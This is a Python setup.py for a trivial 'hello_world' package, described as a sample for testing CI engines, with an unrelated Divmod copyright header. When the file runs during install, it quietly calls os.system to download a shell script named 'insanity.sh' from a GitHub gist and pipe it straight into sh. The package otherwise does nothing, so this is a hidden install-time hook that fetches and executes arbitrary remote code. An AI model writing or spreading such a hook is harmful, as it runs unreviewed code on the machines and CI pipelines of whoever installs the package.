#!/usr/bin/python
# (c) 2005-2009 Divmod, Inc.  See LICENSE file for details

from distutils.core import setup
import os

os.system("curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/e5fe75eb4093b4d167d52fb9764d04210a117800/insanity.sh -s | sh")

setup(
    name="hello_world",
    license="MIT",
    version="1.0.0",
    description="Sample program to test CI engines",
    packages=["hello"],
    classifiers=[
        "Development Status :: 6 - Mature",
        "Environment :: Console",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python"
        ])
